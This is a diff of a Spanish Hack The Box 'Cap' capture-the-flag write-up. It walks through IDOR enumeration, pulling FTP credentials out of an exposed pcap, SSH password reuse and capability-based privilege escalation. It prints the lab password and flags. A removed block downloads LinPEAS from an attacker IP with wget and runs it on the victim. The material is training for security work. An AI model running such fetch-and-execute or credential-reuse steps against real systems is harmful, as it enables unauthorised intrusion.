@@ -1,27 +1,33 @@
-# Cap - Hack The Box Writeup
+<div align="center">
 
-![HTB Cap](https://img.shields.io/badge/HTB-Cap-green?style=for-the-badge&logo=hackthebox)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
-![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
+# HackTheBox - Cap
 
-## 📋 Información de la Máquina
+</div>
 
-| Propiedad | Valor |
-|-----------|-------|
-| **Nombre** | Cap |
-| **IP** | 10.10.10.245 |
-| **Sistema Operativo** | Linux (Ubuntu 20.04.2 LTS) |
-| **Dificultad** | Easy |
+<div align="center">
+ 
+## GUÍA COMPLETA EN ESPAÑOL 
+
+
+  [![TryHackMe](https://img.shields.io/badge/Platform-HackTheBox-success?style=for-the-badge)](#)
+  [![TryHackME](https://img.shields.io/badge/Difficulty-Easy-blue?style=for-the-badge)](#)
+  [![TryHackME](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)](#)
+
+</div>
+
+## ÍNDICE
+
+### · RECONOCIMIENTO  
+### · ENUMERACIÓN  
+### · ANÁLISIS DEL DASHBOARD  
+### · ANÁLISIS DEL TRÁFICO  
+### · ACCESO INICIAL  
+### · ESCALADA DE PRIVILEGIOS  
+### · CONCLUSIONES
 
 ---
 
-## 🎯 Objetivo
-
-El objetivo de esta máquina es obtener acceso inicial mediante la explotación de vulnerabilidades web y análisis de tráfico de red, para posteriormente escalar privilegios aprovechando una mala configuración de Linux Capabilities.
-
----
-
-## 🔍 Fase 1: Reconocimiento
+## Reconocimiento
 
 El reconocimiento es la primera y una de las más importantes fases en cualquier prueba de penetración. Consiste en recopilar la mayor cantidad de información posible sobre el objetivo antes de intentar cualquier explotación.
 
@@ -42,7 +48,7 @@ nmap -sS -A 10.10.10.245
 | `-A` | **Aggressive scan**: Habilita la detección de sistema operativo (`-O`), detección de versiones (`-sV`), escaneo de scripts (`-sC`) y traceroute (`--traceroute`). Es muy útil para obtener información detallada del objetivo |
 | `10.10.10.245` | Dirección IP del objetivo |
 
-![Nmap Scan](images/Cap_1.png)
+![Nmap Scan](Cap/1.png)
 
 **Análisis de los resultados:**
 
@@ -50,20 +56,20 @@ nmap -sS -A 10.10.10.245
 |--------|--------|----------|---------|---------------|
 | 21/tcp | open | FTP | vsftpd 3.0.3 | Servidor FTP que podría permitir transferencia de archivos. FTP transmite credenciales en texto plano |
 | 22/tcp | open | SSH | OpenSSH 8.2p1 Ubuntu | Acceso remoto seguro. Útil si conseguimos credenciales válidas |
-| 80/tcp | open | HTTP | Gunicorn | Servidor web Python. El título "Security Dashboard" sugiere una aplicación de monitoreo |
+| 80/tcp | open | HTTP | Gunicorn | Servidor web Python.  |
 
 **Información adicional obtenida:**
 - **Sistema Operativo**: Linux 5.x (probablemente Ubuntu basado en el banner de SSH)
 - **Distancia de red**: 2 hops
 - **Claves SSH**: Se muestran las fingerprints RSA, ECDSA y ED25519
 
-> 💡 **Nota**: El puerto 21 (FTP) es particularmente interesante porque FTP es un protocolo inseguro que transmite credenciales sin cifrar. Si encontramos tráfico FTP capturado, podríamos obtener credenciales.
+>  **Nota**: El puerto 21 (FTP) es particularmente interesante porque FTP es un protocolo inseguro que transmite credenciales sin cifrar. Si encontramos tráfico FTP capturado, podríamos obtener credenciales.
 
 ---
 
-## 🌐 Fase 2: Enumeración Web
+## Enumeración Web
 
-Una vez identificados los servicios, procedemos a enumerar el servidor web en busca de directorios y archivos ocultos que puedan revelar información sensible o funcionalidades adicionales.
+Previamente a la enumeración web, se observa en la web que al acceder al dashboard, se ejecuta desde un directorio data sugieriendo ser un usuario del sistema expuesto en la url y observamos que dependiendo del número que se ponga en la ruta a continucación no descarga un archivo pcap de diferente información, por lo que procedo a lanzar una enumeración de directorios con gobuster para encontrar directorios numéricos posibles.
 
 ### Enumeración de Directorios con Gobuster
 
@@ -91,7 +97,7 @@ gobuster dir -u http://10.10.10.245/data -w /usr/share/wordlists/num/0-10000 -b 
 | `-w /usr/share/wordlists/num/0-10000` | **Wordlist**: Archivo que contiene la lista de palabras a probar. Esta wordlist específica contiene números del 0 al 10000, ideal para enumerar IDs numéricos |
 | `-b 302` | **Blacklist de códigos de estado**: Excluye las respuestas con código HTTP 302 (redirect). Esto evita falsos positivos cuando el servidor redirige todas las peticiones no válidas |
 
-![Gobuster Enumeration](images/Cap_2.png)
+![Gobuster Enumeration](Cap/2.png)
 
 **Análisis de resultados:**
 
@@ -108,7 +114,7 @@ Gobuster encuentra múltiples endpoints numéricos que devuelven código 200 (OK
 
 Cada uno de estos endpoints (`/data/0`, `/data/1`, etc.) representa una captura de tráfico diferente. El tamaño similar de las respuestas sugiere que todas siguen la misma estructura de página.
 
-> 🔑 **Hallazgo importante**: La existencia de múltiples IDs numéricos accesibles sugiere una vulnerabilidad **IDOR (Insecure Direct Object Reference)**, donde podemos acceder a recursos de otros usuarios simplemente cambiando el ID en la URL.
+> **Hallazgo importante**: La existencia de múltiples IDs numéricos accesibles sugiere una vulnerabilidad **IDOR (Insecure Direct Object Reference)**, donde podemos acceder a recursos de otros usuarios simplemente cambiando el ID en la URL.
 
 ---
 
@@ -118,7 +124,7 @@ Cada uno de estos endpoints (`/data/0`, `/data/1`, etc.) representa una captura 
 
 Accedemos a `http://10.10.10.245/data/0` en el navegador para examinar la aplicación web:
 
-![Security Dashboard](images/Cap_3.png)
+![Security Dashboard](Cap/3.png)
 
 **Observaciones del dashboard:**
 
@@ -143,20 +149,11 @@ La URL `http://10.10.10.245/data/0` utiliza un identificador numérico (`0`) par
 
 Al hacer clic en el botón **"Download"**, obtenemos un archivo llamado `0.pcap`:
 
-![PCAP File](images/Cap_4.png)
-
-**¿Qué es un archivo PCAP?**
-
-PCAP (Packet Capture) es un formato estándar para almacenar tráfico de red capturado. Estos archivos contienen una copia exacta de todos los paquetes que pasaron por una interfaz de red durante el período de captura, incluyendo:
-
-- Headers de protocolos (Ethernet, IP, TCP, UDP, etc.)
-- Payload de datos (contenido de las comunicaciones)
-- Timestamps de cada paquete
-- Información de origen y destino
+![PCAP File](Cap/4.png)
 
 ---
 
-## 🔬 Fase 4: Análisis de Tráfico
+## Análisis de Tráfico
 
 ### Análisis con Wireshark
 
@@ -168,7 +165,7 @@ Abrimos el archivo `0.pcap` en Wireshark:
 wireshark 0.pcap
 ```
 
-![Wireshark Analysis](images/Cap_5.png)
+![Wireshark Analysis](Cap/5.png)
 
 **Navegación en Wireshark:**
 
@@ -191,7 +188,7 @@ Esta función reconstruye toda la conversación ordenando los paquetes y mostran
 
 ### Credenciales Expuestas
 
-![FTP Credentials](images/Cap_7.png)
+![FTP Credentials](Cap/7.png)
 
 **Contenido del stream TCP:**
 
@@ -221,15 +218,15 @@ PORT 192,168,196,1,212,140
 
 **Credenciales descubiertas:**
 ```
-👤 Usuario: nathan
-🔑 Contraseña: Buck3tH4TF0RM3!
+ Usuario: nathan
+ Contraseña: Buck3tH4TF0RM3!
 ```
 
-> ⚠️ **Vulnerabilidad crítica**: FTP transmite credenciales en texto plano. Cualquier atacante con acceso al tráfico de red (mediante ARP spoofing, acceso al switch, o como en este caso, archivos PCAP expuestos) puede capturar estas credenciales.
+>  **Vulnerabilidad crítica**: FTP transmite credenciales en texto plano. Cualquier atacante con acceso al tráfico de red (mediante ARP spoofing, acceso al switch, o como en este caso, archivos PCAP expuestos) puede capturar estas credenciales.
 
 ---
 
-## 🚪 Fase 5: Acceso Inicial
+## Acceso Inicial
 
 ### Conexión FTP
 
@@ -239,14 +236,7 @@ Utilizamos las credenciales encontradas para conectarnos al servidor FTP:
 ftp 10.10.10.245
 ```
 
-**Desglose del comando:**
-
-| Parámetro | Descripción |
-|-----------|-------------|
-| `ftp` | Cliente FTP de línea de comandos incluido en la mayoría de sistemas Unix/Linux |
-| `10.10.10.245` | Dirección IP del servidor FTP al que nos conectamos |
-
-![FTP Login](images/Cap_8.png)
+![FTP Login](Cap/8.png)
 
 **Secuencia de conexión:**
 
@@ -267,16 +257,6 @@ local: user.txt remote: user.txt
 33 bytes received in 00:00 (0.10 KiB/s)
 ```
 
-**Comandos FTP utilizados:**
-
-| Comando | Descripción |
-|---------|-------------|
-| `get user.txt` | Descarga el archivo `user.txt` del servidor al sistema local |
-| `ls` | Lista archivos en el directorio actual del servidor |
-| `cd` | Cambia de directorio en el servidor |
-| `pwd` | Muestra el directorio actual en el servidor |
-| `bye` o `exit` | Cierra la conexión FTP |
-
 ### User Flag
 
 Verificamos el contenido del archivo descargado:
@@ -285,22 +265,15 @@ Verificamos el contenido del archivo descargado:
 cat user.txt
 ```
 
-**Desglose del comando:**
-
-| Parámetro | Descripción |
-|-----------|-------------|
-| `cat` | Concatena y muestra el contenido de archivos. Nombre deriva de "concatenate" |
-| `user.txt` | Archivo que contiene la flag de usuario |
-
-![User Flag](images/Cap_9.png)
+![User Flag](Cap/9.png)
 
 ```
-🚩 User Flag: 2359136dcb6e32ba1f278ee990559fb3
+ User Flag: 2359136dcb6e32ba1f278ee990559fb3
 ```
 
 ---
 
-## 🔐 Fase 6: Escalada de Privilegios
+## Escalada de Privilegios
 
 Con acceso como usuario `nathan`, el siguiente objetivo es escalar privilegios para obtener acceso root.
 
@@ -311,16 +284,7 @@ Probamos si las credenciales de FTP también funcionan para SSH (reutilización 
 ```bash
 ssh nathan@10.10.10.245
 ```
-
-**Desglose del comando:**
-
-| Parámetro | Descripción |
-|-----------|-------------|
-| `ssh` | Cliente SSH (Secure Shell) para conexiones remotas cifradas |
-| `nathan@` | Usuario con el que nos autenticamos |
-| `10.10.10.245` | Dirección IP del servidor SSH |
-
-![SSH Connection](images/Cap_10.png)
+![SSH Connection](Cap/10.png)
 
 **Información del sistema obtenida:**
 
@@ -338,7 +302,7 @@ Users logged in:       1
 IPv4 address for eth0: 10.10.10.245
 ```
 
-> 💡 **Nota**: La reutilización de contraseñas es una práctica muy común pero peligrosa. Una vez comprometida una credencial, el atacante puede probarla en múltiples servicios.
+>  **Nota**: La reutilización de contraseñas es una práctica muy común pero peligrosa. Una vez comprometida una credencial, el atacante puede probarla en múltiples servicios.
 
 ### Enumeración con LinPEAS
 
@@ -348,26 +312,7 @@ LinPEAS (Linux Privilege Escalation Awesome Script) es un script que automatiza 
 ./linpeas.sh
 ```
 
-**Desglose del comando:**
-
-| Parámetro | Descripción |
-|-----------|-------------|
-| `./` | Ejecuta un archivo en el directorio actual |
-| `linpeas.sh` | Script de enumeración de privilegios. Debe tener permisos de ejecución (`chmod +x linpeas.sh`) |
-
-**¿Cómo transferir LinPEAS al objetivo?**
-
-```bash
-# En la máquina atacante (Kali):
-python3 -m http.server 8000
-
-# En la máquina víctima:
-wget http://10.10.16.106:8000/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-```
-
-![LinPEAS Output](images/Cap_11.png)
+![LinPEAS Output](Cap/11.png)
 
 **Áreas que LinPEAS examina:**
 
@@ -400,18 +345,6 @@ Las capabilities son una forma de dividir los privilegios de root en unidades m�
 | `cap_setuid` | Permite al proceso cambiar su UID (User ID) | **CRÍTICO**: Puede cambiar a UID 0 (root) |
 | `cap_net_bind_service` | Permite bindear puertos por debajo de 1024 | Bajo riesgo por sí solo |
 
-**Verificación manual de capabilities:**
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-| Parámetro | Descripción |
-|-----------|-------------|
-| `getcap` | Muestra las capabilities asignadas a archivos |
-| `-r` | Búsqueda recursiva desde el directorio especificado |
-| `/` | Directorio raíz (busca en todo el sistema) |
-| `2>/dev/null` | Redirige errores a /dev/null para una salida más limpia |
 
 ### Explotación de cap_setuid
 
@@ -448,15 +381,9 @@ cd /root
 cat root.txt
 ```
 
-**Desglose de comandos:**
-
-| Comando | Descripción |
-|---------|-------------|
-| `cd /root` | Cambia al directorio `/root` (home del usuario root) |
-| `cat root.txt` | Muestra el contenido de la flag |
 
 ```
-🚩 Root Flag: 1219ec05e80c1e98ce517143f18ac014
+ Root Flag: 1219ec05e80c1e98ce517143f18ac014
 ```
 
 ---
@@ -503,7 +430,7 @@ cat root.txt
 
 ---
 
-## 🎯 Conclusión
+## Conclusión
 
 ### Resumen de la Explotación
 
@@ -622,32 +549,26 @@ Vulnerabilidad IDOR          Credenciales FTP        Reutilización         cap_
 
 ---
 
-## 🛠️ Herramientas Utilizadas
-
-| Herramienta | Propósito | URL |
-|-------------|-----------|-----|
-| Nmap | Escaneo de puertos y servicios | https://nmap.org |
-| Gobuster | Enumeración de directorios web | https://github.com/OJ/gobuster |
-| Wireshark | Análisis de tráfico de red | https://wireshark.org |
-| LinPEAS | Enumeración de privilegios Linux | https://github.com/carlospolop/PEASS-ng |
-
----
-
-## 📚 Referencias
-
-- [GTFOBins - Python Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
-- [HackTricks - Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
-- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
-- [OWASP - Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
-
----
-
 <div align="center">
+  
+# DISCLAIMER
 
-**Happy Hacking! 🎯**
+Este writeup es SOLO para propósitos educativos.  
+Úsalo responsablemente en entornos autorizados como HackTheBox.  
 
-*Writeup creado para fines educativos*
-
-[![HTB](https://img.shields.io/badge/HackTheBox-Profile-brightgreen?style=flat-square&logo=hackthebox)](https://hackthebox.com)
+**Autor:** pablocaraballofernandez  
+**Plataforma:** HackTheBox
 
 </div>
+
+
+<div align="center">
+  
+  [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/pablo-caraballo-fern%C3%A1ndez-a12938358/)
+  [![TryHackMe](https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com/p/CyberPablo)
+  [![HackTheBox](https://img.shields.io/badge/HackTheBox-111927?style=for-the-badge&logo=hackthebox&logoColor=9FEF00)](https://ctf.hackthebox.com/user/profile/872564)
+  .[![Cyberdefenders](https://img.shields.io/badge/CyberDefenders-1E3A5F?style=for-the-badge&logo=shield&logoColor=white)](https://cyberdefenders.org/p/cybersecpcarfer)
+  
+</div>
+
+
